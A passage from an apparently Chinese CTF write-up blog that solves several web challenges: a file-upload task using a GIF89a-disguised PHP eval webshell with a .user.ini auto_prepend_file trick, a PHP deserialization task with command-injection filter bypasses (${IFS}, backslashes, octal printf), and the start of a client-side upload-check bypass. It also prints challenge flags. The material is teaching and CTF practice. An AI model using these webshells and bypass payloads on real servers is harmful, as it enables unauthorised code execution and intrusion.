<p>**服务器脚本语言为PHP **</p>
<p>**服务器使用CGI **</p>
<p>**FastCGI模式 **</p>
<p><strong>上传目录下要有可执行的php文件</strong></p>
</li>
<li><p>**==图片头文件GIF89a==**：</p>
<p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年发行），但在<strong>Web上所见到的大多数图形都是以89a版的格式创建的</strong>。 89a版的一个最主要的优势就是<strong>可以创建动态图像</strong>，特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p>
</li>
<li><p><strong>关于在Content-Type中multipart/form-data的解析：</strong></p>
<p><strong>boundary是表示分隔，用于分隔多个文件。格式是：–后面跟着一串随机数</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNolPbAiXBmFZAw6W<br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>//提交为文件<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="fileUpload"; filename=".user.ini"<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br>//这里的content-type是文件类型，浏览器自己判断<br>GIF89a<br>auto_prepend_file=b.jpg<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="upload"<br>æäº¤<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W--<br><br>//提交为表单字段<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="note"<br>字段内容<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br></code></pre></td></tr></table></figure></li>
</ul>
<h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p>首先试一下能不能访问<code>index.phps</code>，<code>flag.php</code>，好吧，都没用。题目的意思一个是想让我们上传一张图片。我们先上传其他的类型的文件试试：</p>
<p>上传.txt文件回显：<code>your filetype looks wicked</code>（你的文件是恶意的），说明大部分的文件格式被过滤</p>
<p>上传图片文件回显：<code>file upload successful, the path is:  uploads/2051259.jpg</code></p>
<p>可以知道文件上传后是存放在uploads/文件夹里</p>
<p><strong>我们需要明确一点，文件上传的解题是需要我们上传可执行文件，从而控制服务端</strong></p>
<p><strong>所以我们这里使用.user.ini配置文件来让index.php文件包含一个webshell，所以我们先创建一个包含shell语句的图片马b.txt</strong></p>
<p>内容如下：之后修改文件后缀为.gif，直接上传即可，因为图片文件未被过滤</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br>&lt;?=eval($_REQUEST<span class="hljs-section">['cmd']</span>)<span class="hljs-comment">;?&gt;</span><br></code></pre></td></tr></table></figure>

<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_6.jpg" srcset="/img/loading.gif" lazyload class="">

<p><strong>之后想办法上传.user.ini文件，但会被过滤，所以我们使用BP抓包，修改上传文件的类型<code>application/octet-stream</code>为<code>image/gif</code>,</strong></p>
<p>创建一个.user.ini文件，其内容如下：auto_prepend_file是指当前目录下的任意php文件都要包含=之后的文件</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=b.gif<br></code></pre></td></tr></table></figure>

<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_5.jpg" srcset="/img/loading.gif" lazyload class="">

<p>上传成功，未被过滤</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_7.jpg" srcset="/img/loading.gif" lazyload class="">

<p>下面我们使用蚁剑连接服务器：</p>
<p>首先查看地址，是要在<code>/uploads</code>目录下</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_4.jpg" srcset="/img/loading.gif" lazyload class="">

<p>连接成功，可能会连接不上，多上传几次</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_2.jpg" srcset="/img/loading.gif" lazyload class="">

<p>在根目录下发现flag</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_3.jpg" srcset="/img/loading.gif" lazyload class="">

<p>答案：cyberpeace{9f37b587e6875ce35380526dba1120c6}</p>
<h4 id="8-unseping-江苏工匠杯（过滤的绕过）"><a href="#8-unseping-江苏工匠杯（过滤的绕过）" class="headerlink" title="8_unseping 江苏工匠杯（过滤的绕过）"></a>8_unseping 江苏工匠杯（过滤的绕过）</h4><h5 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">"ping"</span>))) {<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        }<br>    } <br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>{<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">"/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/"</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"don't hack"</span>;<br>        }<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        }<br>    }   <br>}<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ctf'</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p><strong>PHP序列化和反序列化</strong>：</p>
<p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p>
<p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p>
<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>
<p>常见的php序列化和反序列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>
</li>
<li><p>反序列化中常见的魔术函数：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>() 当一个对象创建时被调用，反序列化不触发<br><span class="hljs-built_in">__destruct</span>()  当一个对象销毁时被调用<br><span class="hljs-built_in">__toString</span>()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接<br><span class="hljs-built_in">__call</span>()      当调用的方法不存在时触发<br><span class="hljs-built_in">__invoke</span>()    当一个对象被当作函数调用时触发<br><span class="hljs-built_in">__wakeup</span>()    反序列化时自动调用<br><span class="hljs-built_in">__sleep</span>()     执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__get</span>()       类中的属性私有或不存在触发<br><span class="hljs-built_in">__set</span>()       类中的属性私有或不存在触发<br></code></pre></td></tr></table></figure>
</li>
<li><p>PHP函数：</p>
<ul>
<li>call_user_func_array：把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</li>
<li>exec：用来执行一个外部程序，不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面</li>
<li>passthru：只调用命令，把命令的运行结果原样地直接输出到标准输出设备上</li>
<li>system：输出并返回最后一行shell结果</li>
</ul>
</li>
<li><p><strong>==shell语句被过滤的一些绕过技巧：==</strong></p>
<p><strong>空格被过滤：</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt; 、&lt;&gt;、%09(tab键)、%20、$IFS$9、$IFS$1、${IFS}、$IFS等，还可以用{} 比如 {cat,flag}<br></code></pre></td></tr></table></figure>

<p><strong>敏感字符被过滤：</strong></p>
<p>字符串转为8进制</p>
</li>
<li><p>linux中的**<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="28.397ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 12551.4 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(2444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(3444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">用</text></g><g data-mml-node="mi" transform="translate(4444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">于</text></g><g data-mml-node="mi" transform="translate(5444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">执</text></g><g data-mml-node="mi" transform="translate(6444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">行</text></g><g data-mml-node="mi" transform="translate(7444.4,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(7913.4,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(8489.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(8955.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(9253.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(9551.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">命</text></g><g data-mml-node="mi" transform="translate(10551.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">令</text></g><g data-mml-node="mi" transform="translate(11551.4,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">：</text></g></g></g></svg></mjx-container>(shell)</p>
</li>
<li><h5 id="linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”"><a href="#linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”" class="headerlink" title="==linux中的printf函数支持字符串的8进制表示的读入==：使用printf “hello world”"></a>==linux中的<code>printf</code>函数支持字符串的8进制表示的读入==：使用printf “hello world”</h5></li>
</ul>
<h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>​        这是一个很明显的反序列化题。首先可以明确的是我们需要传入一个POST变量ctf，其反序列化生成的对象时，会首先调用construct函数构造一个对象，然后调用__wakeup函数，其调用了waf，去检测<code>args</code>里是否有敏感字符<code>cat|flag|tac|php|ls</code>，这里说明args应该是一个数组，先记下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {<br>    <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//检测敏感字符</span><br>}<br></code></pre></td></tr></table></figure>

<p>然后代码结束，调用__destruct函数，发现这是在查看上传的method是否在数组ping中，如果有，则调用<code>call_user_func_array</code>，将<code>array($this, $this-&gt;method)</code>作为函数，<code>this-&gt;args</code>作为函数参数，很显然，我们应该去调用ping函数，<strong>里面有exec函数，这个函数可以使用系统命令，我们可以查看当前服务器下的一些东西</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>{<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>}<br></code></pre></td></tr></table></figure>

<p><strong>那么上传变量的产生方式应为：在PHP代码里生成序列化，然后base64-encode。</strong></p>
<p>比如我们想要查看index.php同级目录下的文件，</p>
<p>我们可以在PHP中这样写：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'ls'</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//但是我们想起来之前有一段对输入数组的过滤，其中就有ls，那么我们应该写为</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'l\s'</span>));<span class="hljs-comment">//使用反写杠绕过过滤</span><br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</span><br></code></pre></td></tr></table></figure>

<p><strong>注意用POST参数传入</strong></p>
<p>那么我得到回显：<code>array(2) { [0]=&gt; string(12) "flag_1s_here" [1]=&gt; string(9) "index.php" }</code></p>
<p>说明index.php同级目录下还有一个<code>flag_1s_here</code>文件，没有后缀的话，可能时目录，编写shell，继续执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'l\s${IFS}-l${IFS}fl\ag_1s_here'</span>));<span class="hljs-comment">//注意flag和空格也被过滤掉，分别用反斜杠和${IFS}绕过</span><br>    <br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozMDoibFxzJHtJRlN9LWwke0lGU31mbFxhZ18xc19oZXJlIjt9fQ==</span><br></code></pre></td></tr></table></figure>

<p>回显：<code>array(2) { [0]=&gt; string(7) "total 4" [1]=&gt; string(64) "-rwxr-xr-x 1 root root 53 Nov 9 13:21 flag_831b69012c67b35f.php" }</code></p>
<p>flag应该就在<code>flag_831b69012c67b35f.php</code>里了</p>
<p><strong>因为<code>/</code>被过滤掉了，所以将字符串转为8进制，正常的字符串应该这样写</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'$(printf${IFS}"cat /flag_1s_here/flag_831b69012c67b35f.php")'</span>));<br></code></pre></td></tr></table></figure>

<p>那么转为8进制则为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'</span>));<br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</span><br></code></pre></td></tr></table></figure>

<p>最后访问即可得到flag：<code>cyberpeace{48a58397b3c434b2436426a5c3479d12}</code></p>
<h4 id="9-upload1"><a href="#9-upload1" class="headerlink" title="9_upload1"></a>9_upload1</h4><h5 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h5><p>文件上传题，检查网页源码，如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) {  </span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;  </span><br><span class="language-javascript">    <span class="hljs-keyword">while</span> (i--) {  </span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>[i] === obj) {  </span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  </span><br><span class="language-javascript">        }</span><br><span class="language-javascript">    }</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  </span><br><span class="language-javascript">}</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>){</span><br><span class="language-javascript">upfile = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"upfile"</span>);</span><br><span class="language-javascript">submit = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"submit"</span>);</span><br><span class="language-javascript">name = upfile.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">ext = name.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.+\./</span>,<span class="hljs-string">''</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>([<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>].<span class="hljs-title function_">contains</span>(ext)){</span><br><span class="language-javascript">	submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">}<span class="hljs-keyword">else</span>{</span><br><span class="language-javascript">	submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">	<span class="hljs-title function_">alert</span>(<span class="hljs-string">'请选择一张图片文件上传!'</span>);</span><br><span class="language-javascript">}</span><br><span class="language-javascript">}</span><br></code></pre></td></tr></table></figure>

<h5 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li>本题JS绕过：修改上传文件后缀</li>
</ul>
<h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>文件上传题，想办法上传webshell，很明显前端有一个JS过滤，有两种办法，一种是在网页元素里删除JS后上传，另一种是上传图片🐎，我这里选择上传图片🐎。</p>
